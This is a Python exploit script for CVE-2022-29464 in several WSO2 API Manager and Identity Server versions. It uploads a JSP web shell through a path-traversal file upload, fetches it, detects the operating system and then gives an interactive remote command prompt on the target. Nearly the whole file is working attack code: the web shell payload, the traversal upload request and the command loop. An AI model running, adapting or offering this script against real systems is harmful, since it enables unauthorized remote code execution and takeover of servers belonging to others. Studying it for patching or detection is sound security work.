# Interactive exploit for CVE-2022-29464
# by gbrsh

# Affected software:
#     WSO2 API Manager 2.2.0 - 4.0.0
#     WSO2 Identity Server 5.2.0 - 5.11.0
#     WSO2 Identity Server Analytics 5.4.0, 5.4.1, 5.5.0, 5.6.0
#     WSO2 Identity Server as Key Manager 5.3.0 - 5.10.0
#     WSO2 Enterprise Integrator 6.2.0 - 6.6.0

# Usage: 

#     python3 test.py https://172.16.218.132:9443

#              --- [CVE-2022-29464] ---
#               (remote code execution)
#                  by gbrsh

#     Uploading payload: done
#     Poking payload: done
#     Detecting OS: Microsoft Windows 10 Home

#     >> whoami 
#     desktop-82p20ms\admin
#     >> exit

import sys
import requests
from urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, Style

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


print()
print(Fore.BLUE + "\t\t --- [CVE-2022-29464] ---")
print("\t\t  (remote code execution)")
print("\t\t\t by gbrsh")
print(Style.RESET_ALL)


if len(sys.argv) != 2:
    print("Usage: python3 %s https://target:9443" % sys.argv[0])
    exit()
    
target = sys.argv[1]
payload = """
<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
"""

print("Uploading payload:", end=' ')
files = {"../../../../repository/deployment/server/webapps/authenticationendpoint/evil.jsp": payload}
res = requests.post('%s/fileupload/toolsAny' % target, files=files, verify=False)

if res.status_code == 200:
    print(Fore.GREEN + "done")
else:
    print(Fore.RED + "error")
    exit()

print(Style.RESET_ALL +"Poking payload:", end=' ')
res = requests.get("%s/authenticationendpoint/evil.jsp" % target, verify=False)
if res.status_code == 200:
    print(Fore.GREEN + "done")
else:
    print(Fore.RED + "error")
    exit()


params = {"cmd" : "uname -a"}
print(Style.RESET_ALL +"Detecting OS:", end=' ')
res = requests.get("%s/authenticationendpoint/evil.jsp" % target, params=params, verify=False)
if res.status_code == 200:
    print(Fore.GREEN + res.text.strip())
else:
    params = {"cmd" : "wmic os get caption /value"}
    res = requests.get("%s/authenticationendpoint/evil.jsp" % target, params=params, verify=False)
    if res.status_code == 200:
        print(Fore.GREEN + res.text.strip()[8:])
    else:
        print(Fore.RED + "error")

print(Style.RESET_ALL)
while 1:
    cmd = input(">> ")
    if cmd == "exit":
        exit()

    params = {"cmd" : cmd}
    res = requests.get("%s/authenticationendpoint/evil.jsp" % target, params=params, verify=False)
    if(res.status_code == 200):
        print(res.text.strip())


